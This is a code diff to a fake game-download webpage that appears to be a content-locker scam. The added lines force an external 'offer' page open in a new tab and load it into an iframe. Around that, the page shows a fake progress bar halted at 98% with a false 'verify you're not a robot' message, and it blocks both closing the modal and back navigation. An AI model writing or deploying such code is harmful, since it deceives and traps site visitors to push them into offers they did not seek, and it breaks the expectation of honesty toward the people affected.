@@ -1238,8 +1238,12 @@
             });
         }
 
-        // Download functionality
+        // Download functionality - MODIFIED TO OPEN OFFER IN NEW TAB
         function startDownload(gameName, gameLogo) {
+            // Open the offer in a new tab immediately
+            window.open('https://tundrafile.com/1810159', '_blank');
+            
+            // Show the download modal
             const downloadModal = document.getElementById('downloadModal');
             const modalGameLogo = document.getElementById('modalGameLogo');
             const modalTitle = document.getElementById('modalTitle');
@@ -1276,41 +1280,10 @@
                     clearInterval(interval);
                     document.getElementById('progressText').textContent = 'Download paused at 98% - Complete an offer to verify you\'re not a robot';
                     document.getElementById('contentLocker').style.display = 'block';
-                    // Simulate offer completion check
-                    checkOfferCompletion();
+                    // Show the offer in the modal
+                    document.querySelector('.offer-frame').src = 'https://tundrafile.com/1810159';
                 }
             }, 51.0204); // 5000ms / 98 = ~51.02ms per increment
-        }
-
-        function checkOfferCompletion() {
-            // Simulated offer completion check
-            const offerFrame = document.querySelector('.offer-frame');
-            offerFrame.addEventListener('load', () => {
-                // Simulate API verification delay
-                setTimeout(() => {
-                    // After verification, complete the download
-                    completeDownload();
-                }, 2000);
-            });
-        }
-
-        function completeDownload() {
-            let progress = 98;
-            const interval = setInterval(() => {
-                progress += 1;
-                document.getElementById('progressBar').style.width = progress + '%';
-                document.getElementById('progressText').textContent = `Downloading... ${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    document.getElementById('progressText').textContent = 'Download Complete!';
-                    setTimeout(() => {
-                        document.getElementById('downloadModal').style.display = 'none';
-                        document.body.style.overflow = 'auto';
-                        window.onpopstate = null; // Re-enable back navigation
-                        alert('Download completed successfully!');
-                    }, 1000);
-                }
-            }, 500); // Finish last 2% in 1 second
         }
 
         // Prevent closing modal during download
